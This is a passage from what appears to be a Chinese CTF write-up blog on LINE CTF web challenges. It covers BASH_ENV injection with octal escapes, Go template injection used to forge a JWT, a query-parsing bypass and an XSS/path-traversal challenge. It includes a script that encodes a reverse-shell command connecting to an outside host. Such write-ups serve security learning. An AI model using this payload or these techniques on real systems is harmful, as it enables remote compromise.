    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">bye</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token string">"/=/i"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">bye</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token string">"/[a-zA-Z]/i"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"{$k}={$v}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"bash -c 'imdude'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"env"</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">bye</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token string">"/=/i"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"{$k}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
</code></pre>
<p>putenv不加等号的话表示unset掉这个变量。不过本身一次处理结束那个变量也就没了，好像也没必要多做操作</p>
<p>不给用字母第一反应8进制，但实际上打了半天打不通。。。本地远程试八进制都没成功，tkmk神仙倒是说他用这个形式<code>$&#39;\000&#39;</code>一打就通了<br>我暂且蒙在鼓里</p>
<p>然后厚着脸皮去问了一下。payload大抵是这个模式，还说可以在man里面搜到，Letmetrytry</p>
<p>发现为什么当初觉得打不通了。。。因为当时本地测试用PHP的getenv函数获取环境变量的值，并不会被解析。所以以为没有解析，实际上直接用system去获取一下就能发现是解析了的，以及没有回显，要靠touch一个东西之类的来打。。。</p>
<p>BASH_ENV可以直接打通，BASH_FUNC打半天没反应<br>以及发现了一个奇怪的事情，直接<code>\000</code>这种八进制echo出来也被解析成了字符串，但是只有<code>$&#39;\000&#39;</code>这种套了$和引号的形式能被正确解析执行命令</p>
<p>这个语法在man里面搜oct会更容易找到</p>
<blockquote>
<p>Words of the form $’string’ are treated specially.  The word expands to string,  with backslash-escaped characters replaced as specified by the ANSI C standard.  Backslash escape sequences, if present,  are  decoded as follows:<br>        \nnn   the  eight-bit  character  whose value is the octal value nnn (one to three octal digits)<br>        \xHH   the eight-bit character whose value  is  the  hexadecimal value HH (one or two hex digits)</p>
</blockquote>
<p>写了个破烂</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> re

payload <span class="token operator">=</span> <span class="token string">"bash -i >&amp; /dev/tcp/www.z3ratu1.cn/10001 0>&amp;1"</span>
result <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">for</span> c <span class="token keyword">in</span> payload<span class="token punctuation">:</span>
    <span class="token keyword">if</span> re<span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token string">"[a-zA-Z]"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span>
        result <span class="token operator">+=</span> <span class="token string">"$'\\"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>oct<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"'"</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        result <span class="token operator">+=</span> c
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"$("</span> <span class="token operator">+</span> result <span class="token operator">+</span> <span class="token string">")"</span><span class="token punctuation">)</span>
</code></pre>
<p>还有一个怪怪的地方，我把所有字符都八进制之后反而打不通了？只把字母八进制才打得通，怪诶</p>
<p><code>LINECTF&#123;well..what_do_you_think_about&#125;</code></p>
<h2 id="gotm"><a href="#gotm" class="headerlink" title="gotm"></a>gotm</h2><p>用go写的一个奇怪的东西，go本身就看不太懂。。。本来以为是打go的jwt，还搜到了一个似乎符合版本的洞。但看了下洞的描述感觉和当前情况不太对的上。最后发现有一个裸的模板注入（我一开始还好奇为什么jwt secret要存在用户账户里面，原来是给go的低危害模板注入泄露）</p>
<pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">root_handler</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    token <span class="token operator">:=</span> r<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"X-Token"</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> token <span class="token operator">!=</span> <span class="token string">""</span> <span class="token punctuation">{</span>
        id<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> <span class="token function">jwt_decode</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span>
        acc <span class="token operator">:=</span> <span class="token function">get_account</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span>
        tpl<span class="token punctuation">,</span> err <span class="token operator">:=</span> template<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span><span class="token string">"Logged in as "</span> <span class="token operator">+</span> acc<span class="token punctuation">.</span>id<span class="token punctuation">)</span>
        <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
        <span class="token punctuation">}</span>
        tpl<span class="token punctuation">.</span><span class="token function">Execute</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> <span class="token operator">&amp;</span>acc<span class="token punctuation">)</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>

        <span class="token keyword">return</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>以及这里其实已经直接字符串拼接了，也没必要再怎么渲染一下，简单来说就是非常垃圾的垃圾代码，直接模板注入获取secret伪造jwt</p>
<p>一开始用<code>&#123;&#123;.pw&#125;&#125;</code>却搞不出来，后来直接<code>&#123;&#123;. &#125;&#125;</code>获取全部属性就有了。。。</p>
<h2 id="Memo-Drive"><a href="#Memo-Drive" class="headerlink" title="Memo Drive"></a>Memo Drive</h2><p>没看，还没上号就被秒了<br>然后看了tkmk的一句话秒杀原理也没看懂。然后赛后找了下wp才发现并没有那么简单，需要对源码进行阅读才能理解其中原理</p>
<p>有用的代码就这么点，这回用的不是经典flask，而是一个小众一点的Starlette</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">view</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>
    context <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        context<span class="token punctuation">[</span><span class="token string">'request'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request
        clientId <span class="token operator">=</span> getClientID<span class="token punctuation">(</span>request<span class="token punctuation">.</span>client<span class="token punctuation">.</span>host<span class="token punctuation">)</span>

        <span class="token keyword">if</span> <span class="token string">'&amp;'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>url<span class="token punctuation">.</span>query <span class="token operator">or</span> <span class="token string">'.'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>url<span class="token punctuation">.</span>query <span class="token operator">or</span> <span class="token string">'.'</span> <span class="token keyword">in</span> unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>query_params<span class="token punctuation">[</span>clientId<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">raise</span>
        
        filename <span class="token operator">=</span> request<span class="token punctuation">.</span>query_params<span class="token punctuation">[</span>clientId<span class="token punctuation">]</span>
        path <span class="token operator">=</span> <span class="token string">'./memo/'</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>request<span class="token punctuation">.</span>query_params<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> filename
        
        f <span class="token operator">=</span> open<span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>
        contents <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        
        context<span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span> <span class="token operator">=</span> filename
        context<span class="token punctuation">[</span><span class="token string">'contents'</span><span class="token punctuation">]</span> <span class="token operator">=</span> contents
    
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span>
    
    <span class="token keyword">return</span> templates<span class="token punctuation">.</span>TemplateResponse<span class="token punctuation">(</span><span class="token string">'/view/view.html'</span><span class="token punctuation">,</span> context<span class="token punctuation">)</span>
</code></pre>
<p>然后绕过那个query和queryparam的操作就略微的玄幻了。一个是用<code>;</code>代替<code>&amp;</code>分隔，会成功的在query_params中获取到两个值，另一个是在HTTP header的host字段加一个<code>#</code>，这样子request.query里就没有内容了。。</p>
<p>这么说是非常玄幻的，具体需要看源码的实现</p>
<p>我直接链接别人的文章<br><a href="https://github.com/aszx87410/huli-blog/blob/master/source/_posts/linectf-2022-writeup.md">https://github.com/aszx87410/huli-blog/blob/master/source/_posts/linectf-2022-writeup.md</a></p>
<p>井号那个操作是因为url是这么个拼起来的<br><code>url = f&quot;&#123;scheme&#125;://&#123;host_header&#125;&#123;path&#125;&quot;</code><br>然后再解析url.query的时候是基于这个url解析的，直接#后面全部被当做hash。而query_params又不属于url，结果就额外另作解析，又能正常通过</p>
<h2 id="Online-library"><a href="#Online-library" class="headerlink" title="Online library"></a>Online library</h2><p>代码怪得一笔，一开始看了个奇怪的地方看了半天。感觉那个地方就是攻击点，后来感觉就是绕不过去，然后看了个奇怪的地方感觉有奇怪的打法但是不会，写到Polaris里面后tkmk神仙秒了</p>
<p>xss题。一共有两个xss点</p>
<p>第一个要post，但cookie是无属性的，也就是前两分钟支持跨域post。但是这里又先把cookie覆盖掉了。当时猜测可能有什么同步异步操作能在这个脚本执行之前先把flag发出来</p>
<pre class=" language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/insert"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">:</span> Express<span class="token punctuation">.</span>Request<span class="token punctuation">,</span> res<span class="token punctuation">:</span> Express<span class="token punctuation">.</span>Response<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">void</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>
        <span class="token keyword">typeof</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>title <span class="token operator">===</span> <span class="token string">"string"</span> <span class="token operator">&amp;&amp;</span>
        req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>title<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> <span class="token number">30</span> <span class="token operator">&amp;&amp;</span>
        <span class="token keyword">typeof</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>content <span class="token operator">===</span> <span class="token string">"string"</span> <span class="token operator">&amp;&amp;</span>
        req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>content<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">256</span>
    <span class="token punctuation">)</span> <span class="token punctuation">{</span>
        res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`&lt;script>document.cookie = 'FLAG=REMOVED'&lt;/script>&lt;h1></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>title<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/h1>&lt;hr/>`</span></span> <span class="token operator">+</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"Something wrong with your book title or contents."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>bot代码</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> Promise<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token operator">></span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">const</span> <span class="token punctuation">[</span>error<span class="token punctuation">,</span> data<span class="token punctuation">]</span><span class="token punctuation">:</span> Array<span class="token operator">&lt;</span>string<span class="token operator">></span> <span class="token operator">=</span> <span class="token keyword">await</span> redis<span class="token punctuation">.</span><span class="token function">blpop</span><span class="token punctuation">(</span><span class="token string">"query"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>data <span class="token operator">&amp;&amp;</span> data<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> Url<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">"http://web"</span> <span class="token operator">+</span> data<span class="token punctuation">)</span><span class="token punctuation">.</span>host <span class="token operator">===</span> <span class="token string">"web"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"> Start to process - http://web"</span> <span class="token operator">+</span> data<span class="token punctuation">)</span>
            <span class="token keyword">await</span><span class="token punctuation">(</span>
                <span class="token keyword">async</span> <span class="token punctuation">(</span>url<span class="token punctuation">:</span> string<span class="token punctuation">)</span><span class="token punctuation">:</span> Promise<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token operator">></span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
                <span class="token keyword">const</span> bot<span class="token punctuation">:</span> Puppeteer<span class="token punctuation">.</span>Browser <span class="token operator">=</span> <span class="token keyword">await</span> Puppeteer<span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
                    product<span class="token punctuation">:</span> <span class="token string">"chrome"</span><span class="token punctuation">,</span>
                    headless<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
                    ignoreHTTPSErrors<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
                    args<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"--no-sandbox"</span><span class="token punctuation">]</span>
                <span class="token punctuation">}</span><span class="token punctuation">)</span>
                <span class="token keyword">const</span> page<span class="token punctuation">:</span> Puppeteer<span class="token punctuation">.</span>Page <span class="token operator">=</span> <span class="token keyword">await</span> bot<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">setCookie</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
                    domain<span class="token punctuation">:</span> <span class="token string">"web"</span><span class="token punctuation">,</span>
                    name<span class="token punctuation">:</span> <span class="token string">"FLAG"</span><span class="token punctuation">,</span>
                    value<span class="token punctuation">:</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>FLAG
                <span class="token punctuation">}</span><span class="token punctuation">)</span>
                <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token punctuation">{</span>
                    timeout<span class="token punctuation">:</span> <span class="token number">10000</span>
                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span>error<span class="token punctuation">:</span> Error<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">void</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
                    console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span>
                <span class="token punctuation">}</span><span class="token punctuation">)</span>
                <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">await</span> bot<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"http://web"</span> <span class="token operator">+</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"> Job Done."</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"> Invalid path."</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>那么问题就是怎么过这个<code>data.startsWith(&quot;/&quot;) &amp;&amp; Url.parse(&quot;http://web&quot; + data).host === &quot;web&quot;</code>玩意了</p>
<p>这里有一个点很怪，为什么要强制限定data.startsWith(“&#x2F;“)，按理说直接在前面拼的web后面加上斜杠就行了。感觉很可疑，然后试了半天Unicode之类的东西</p>
<p>然后发现startsWith显然过不了，那么有没有可能开头是一个斜杠还能让他host解析成web但实际访问的时候不是呢。</p>
<p>又试了半天，不会。。。</p>
<p>然后开始看另一个xss点</p>
<pre class=" language-typescript"><code class="language-typescript">app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">"/:t/:s/:e"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">:</span> Express<span class="token punctuation">.</span>Request<span class="token punctuation">,</span> res<span class="token punctuation">:</span> Express<span class="token punctuation">.</span>Response<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">void</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> s<span class="token punctuation">:</span> <span class="token keyword">number</span> <span class="token operator">=</span> <span class="token function">Number</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>s<span class="token punctuation">)</span>
    <span class="token keyword">const</span> e<span class="token punctuation">:</span> <span class="token keyword">number</span> <span class="token operator">=</span> <span class="token function">Number</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>e<span class="token punctuation">)</span>
    <span class="token keyword">const</span> t<span class="token punctuation">:</span> <span class="token keyword">string</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>t

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token regex">/[\x00-\x1f]|\x7f|\&lt;|\>/</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"Invalid character in book title."</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span>  <span class="token punctuation">{</span>
        Fs<span class="token punctuation">.</span><span class="token function">stat</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`public/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>t<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">,</span> <span class="token punctuation">(</span>err<span class="token punctuation">:</span> NodeJS<span class="token punctuation">.</span>ErrnoException<span class="token punctuation">,</span> stats<span class="token punctuation">:</span> Fs<span class="token punctuation">.</span>Stats<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">void</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"No such a book in bookself."</span><span class="token punctuation">)</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">!==</span> <span class="token number">NaN</span> <span class="token operator">&amp;&amp;</span> e <span class="token operator">!==</span> <span class="token number">NaN</span> <span class="token operator">&amp;&amp;</span> s <span class="token operator">&lt;</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>e <span class="token operator">-</span> s<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token punctuation">(</span><span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"Too large to read."</span><span class="token punctuation">)</span>
                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                        Fs<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`public/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>t<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>err<span class="token punctuation">:</span> NodeJS<span class="token punctuation">.</span>ErrnoException<span class="token punctuation">,</span> fd<span class="token punctuation">:</span> <span class="token keyword">any</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">void</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
                            <span class="token keyword">if</span> <span class="token punctuation">(</span>err <span class="token operator">||</span> <span class="token keyword">typeof</span> fd <span class="token operator">!==</span> <span class="token string">"number"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                                res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"Invalid argument."</span><span class="token punctuation">)</span>
                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                                <span class="token keyword">let</span> buf<span class="token punctuation">:</span> Buffer <span class="token operator">=</span> Buffer<span class="token punctuation">.</span><span class="token function">alloc</span><span class="token punctuation">(</span>e <span class="token operator">-</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>
                                Fs<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>e <span class="token operator">-</span> s<span class="token punctuation">)</span><span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token punctuation">(</span>err<span class="token punctuation">:</span> NodeJS<span class="token punctuation">.</span>ErrnoException<span class="token punctuation">,</span> bytesRead<span class="token punctuation">:</span> <span class="token keyword">number</span><span class="token punctuation">,</span> buf<span class="token punctuation">:</span> Buffer<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">void</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
                                    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`&lt;h1></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>t<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/h1>&lt;hr/>`</span></span> <span class="token operator">+</span> buf<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                                <span class="token punctuation">}</span><span class="token punctuation">)</span>
                            <span class="token punctuation">}</span>
                        <span class="token punctuation">}</span><span class="token punctuation">)</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"There isn't size of book."</span><span class="token punctuation">)</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>title那可控不能xss，剩下的就是一个选择offset+length的读取，并且文件必须存在。简单试了一下可以目录穿越。开始读proc</p>
<p>读啊读啊读啊，不会读。读什么cmdline之类的东西都没什么用，题目的源码里面也没有什么能操作的地方</p>
<p>然后看到这段代码</p>
<pre class=" language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/identify"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">:</span> Express<span class="token punctuation">.</span>Request<span class="token punctuation">,</span> res<span class="token punctuation">:</span> Express<span class="token punctuation">.</span>Response<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">void</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    res<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>username <span class="token operator">===</span> <span class="token string">"string"</span> <span class="token operator">&amp;&amp;</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>username<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>username
            total<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>username<span class="token punctuation">)</span>
            res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
                error<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
                message<span class="token punctuation">:</span> <span class="token string">"Identified successfully."</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
                error<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
                message<span class="token punctuation">:</span> <span class="token string">"Username is invalid or too long."</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
            error<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
            message<span class="token punctuation">:</span> <span class="token string">"You are already identified as "</span> <span class="token operator">+</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
